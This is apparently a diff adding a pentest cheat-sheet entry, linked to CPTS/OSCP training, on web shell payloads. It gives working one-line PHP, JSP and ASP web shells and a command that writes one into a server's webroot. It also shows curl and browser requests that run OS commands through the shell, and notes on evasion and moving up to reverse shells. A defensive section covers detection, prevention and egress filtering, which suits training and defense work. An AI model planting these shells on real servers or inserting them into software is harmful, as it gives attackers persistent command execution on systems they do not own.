@@ -1,0 +1,99 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "php"
+  ],
+  "tags": [
+    "web-shell",
+    "payload"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Shells & Payloads",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 02: Getting Started",
+  "examples": [
+    {
+      "label": "Write it into the webroot",
+      "command": "echo '<?php system($_REQUEST[\"cmd\"]); ?>' > /var/www/html/shell.php"
+    },
+    {
+      "label": "Execute via browser",
+      "command": "http://SERVER_IP:PORT/shell.php?cmd=id"
+    },
+    {
+      "label": "Execute via cURL",
+      "command": "curl http://SERVER_IP:PORT/shell.php?cmd=id"
+    }
+  ],
+  "notes": "Default webroots: Apache /var/www/html/ | Nginx /usr/local/nginx/html/ | IIS c:\\inetpub\\wwwroot\\ | XAMPP C:\\xampp\\htdocs\\.",
+  "references": [
+    {
+      "title": "HTB Academy - Getting Started",
+      "url": "https://academy.hackthebox.com/module/details/77"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "gs-reverse-shells",
+      "rel": "next",
+      "note": "Trade the webshell up to a reverse shell."
+    },
+    {
+      "id": "gs-nc-listener",
+      "rel": "prereq",
+      "note": "Have a listener ready."
+    }
+  ],
+  "id": "gs-web-shells",
+  "name": "Web Shell Payloads",
+  "command": "<?php system($_REQUEST[\"cmd\"]); ?>",
+  "description": "Drop a one-line web shell into the webroot to run OS commands via a URL parameter. Choose the language matching the app (PHP/JSP/ASP).",
+  "variations": [
+    {
+      "label": "PHP",
+      "command": "<?php system($_REQUEST[\"cmd\"]); ?>"
+    },
+    {
+      "label": "JSP",
+      "command": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
+    },
+    {
+      "label": "ASP",
+      "command": "<% eval request(\"cmd\") %>"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1505.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "A web shell placed in the webroot executes OS commands via HTTP requests to the web server. Because it is a file on disk, it persists across reboots without requiring re-exploitation.\n\n[MITRE T1505.003] Adversaries install web shell files (PHP, JSP, ASP scripts) in web server directories to gain persistent HTTP-accessible code execution. The web server process (Apache, nginx, IIS) becomes the execution vehicle, spawning shells under the web server account.",
+    "prerequisites": "Write access to the webroot (via an upload flaw, LFI/RFI, or misconfiguration) and the ability to reach the file over HTTP.",
+    "impact": "OS command execution as the web-server user via HTTP requests — a persistent foothold that survives reboots.",
+    "detection": "[MITRE T1505.003] Monitor for unexpected file creation in web directories followed by the web server process spawning command shells or scripting interpreters (w3wp.exe, apache2 → cmd.exe/bash). File integrity monitoring on web directories will catch unauthorized .php/.asp/.jsp file writes.",
+    "artifacts": "A new script file in the webroot; anomalous POST/GET parameters carrying commands in web access logs; the web-server process spawning cmd/sh children.",
+    "prevention": "[MITRE T1505.003] Disable dangerous functions (PHP eval()) to prevent web shell code execution. Enforce least privilege on web server processes and file system ACLs so only authorized accounts can modify web directories. Audit and remove unexpected write permissions from web paths.",
+    "evasion": "Web shells bypass firewall rules that block new inbound port connections — all communication flows over the existing web port (80 or 443), blending with legitimate web traffic.",
+    "sources": [
+      "HTB M02",
+      "MITRE T1505.003"
+    ],
+    "misconfiguration": "Outbound connections from servers are not filtered — any process can initiate a TCP connection to arbitrary external IPs on any port. This enables reverse shell callbacks. Additionally, common shell payloads (nc, bash, python) are available on the target, and PowerShell execution policy is not enforced.",
+    "vulnerable_config": "# No egress firewall rules on compromised host:\niptables -L OUTPUT  # policy ACCEPT, no rules\n# nc, bash, python3 all available\n\n# Windows — PowerShell unrestricted:\nGet-ExecutionPolicy  # Unrestricted or Bypass\n# Defender not detecting reverse shell payloads (AV evasion successful)",
+    "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows — PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution"
+  }
+}
